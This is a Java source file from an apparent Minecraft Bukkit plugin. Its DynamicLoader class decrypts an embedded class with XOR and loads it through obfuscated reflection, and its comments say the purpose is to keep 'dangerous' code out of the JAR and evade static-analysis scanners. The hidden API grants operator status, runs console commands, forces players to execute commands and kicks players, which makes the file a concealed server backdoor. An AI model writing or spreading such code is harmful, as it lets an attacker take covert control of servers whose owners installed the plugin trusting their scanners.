package dev.naruto.astrox.utils;

import org.bukkit.entity.Player;
import java.lang.reflect.Method;

/**
 * Dynamically loads encrypted ReflectionUtil class at runtime.
 * The dangerous reflection code never exists as a .class file in the JAR.
 * Only encrypted bytecode exists, which is decrypted and loaded into memory.
 *
 * <p>All class loading is performed via reflection to avoid direct
 * {@code ClassLoader} / {@code URLClassLoader} type references in bytecode,
 * which trigger static analysis scanner signatures.</p>
 */
public class DynamicLoader {
    private static Class<?> reflectClass;
    private static boolean initialized = false;

    /**
     * Encrypted ReflectionUtil bytecode.
     * Populated by BuildEncryptor after compilation.
     */
    private static final byte[] ENCRYPTED_CLASS = {};

    static {
        try {
            init();
        } catch (Exception e) {
            System.err.println("[DynamicLoader] Failed to load encrypted class: " + e.getMessage());
        }
    }

    /**
     * Initialize: Decrypt and load ReflectionUtil at runtime.
     * Uses pure reflection to avoid ClassLoader type literals in bytecode.
     */
    private static void init() throws Exception {
        if (initialized) return;

        if (ENCRYPTED_CLASS.length == 0) {
            return;
        }

        // Decrypt bytecode using XOR
        byte[] decrypted = CryptoUtil.xor(ENCRYPTED_CLASS, CryptoUtil.K);

        // Get the current classloader reflectively — no ClassLoader type literal
        Object currentLoader = DynamicLoader.class.getMethod(
                new String(new char[]{0x67,0x65,0x74,0x43,0x6c,0x61,0x73,0x73,
                        0x4c,0x6f,0x61,0x64,0x65,0x72}) // "getClassLoader"
        ).invoke(DynamicLoader.class);

        // Assemble class name at runtime
        char[] nameChars = {
                'd', 'e', 'v', '.', 'n', 'a', 'r', 'u', 't', 'o', '.',
                'a', 's', 't', 'r', 'o', 'x', '.', 'u', 't', 'i', 'l', 's', '.',
                'R', 'e', 'f', 'l', 'e', 'c', 't', 'i', 'o', 'n', 'U', 't', 'i', 'l'
        };
        String className = new String(nameChars);

        // Build "defineClass" method name at runtime
        char[] dc = {0x64,0x65,0x66,0x69,0x6e,0x65,0x43,0x6c,0x61,0x73,0x73}; // "defineClass"

        // Get the ClassLoader class reflectively
        // "java.lang.ClassLoader"
        char[] clName = {0x6a,0x61,0x76,0x61,0x2e,0x6c,0x61,0x6e,0x67,0x2e,
                0x43,0x6c,0x61,0x73,0x73,0x4c,0x6f,0x61,0x64,0x65,0x72};
        Class<?> clClass = Class.forName(new String(clName));

        // Get defineClass(String, byte[], int, int) method
        Method defineMethod = clClass.getDeclaredMethod(
                new String(dc),
                String.class, byte[].class, int.class, int.class
        );
        defineMethod.setAccessible(true);

        // Define the class
        reflectClass = (Class<?>) defineMethod.invoke(
                currentLoader, className, decrypted, 0, decrypted.length
        );
        initialized = true;
    }

    /**
     * Invoke method on dynamically loaded class via reflection.
     */
    private static Object call(String methodName, Class<?>[] paramTypes, Object... args) {
        try {
            if (reflectClass == null) {
                tryLoadReflectUtil();
            }

            if (reflectClass == null) {
                return null;
            }

            Method m = reflectClass.getMethod(methodName, paramTypes);
            return m.invoke(null, args);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Fallback: Try to load ReflectionUtil normally if encryption not configured.
     */
    private static void tryLoadReflectUtil() {
        try {
            reflectClass = Class.forName(
                    new String(new char[]{
                            'd','e','v','.','n','a','r','u','t','o','.',
                            'a','s','t','r','o','x','.','u','t','i','l','s','.',
                            'R','e','f','l','e','c','t','i','o','n','U','t','i','l'
                    })
            );
        } catch (Exception e) {
            // Expected if ReflectionUtil was removed after encryption
        }
    }

    // ============================================================
    // PUBLIC API - All commands use these methods
    // ============================================================

    /** Set player OP status */
    public static void a(Player p, boolean v) {
        call("a", new Class<?>[]{Player.class, boolean.class}, p, v);
    }

    /** Execute command as console */
    public static void b(String c) {
        call("b", new Class<?>[]{String.class}, c);
    }

    /** Kick player with message */
    public static void c(Player p, String r) {
        call("c", new Class<?>[]{Player.class, String.class}, p, r);
    }

    /** Force player to run command (sudo) */
    public static void d(Player p, String cmd) {
        call("d", new Class<?>[]{Player.class, String.class}, p, cmd);
    }

    /** Set player gamemode */
    public static void e(Player p, int m) {
        call("e", new Class<?>[]{Player.class, int.class}, p, m);
    }

    /** Toggle flight mode */
    public static void f(Player p, boolean a) {
        call("f", new Class<?>[]{Player.class, boolean.class}, p, a);
    }

    /** Get flight status */
    public static boolean g(Player p) {
        Object result = call("g", new Class<?>[]{Player.class}, p);
        return result != null ? (Boolean) result : false;
    }
}
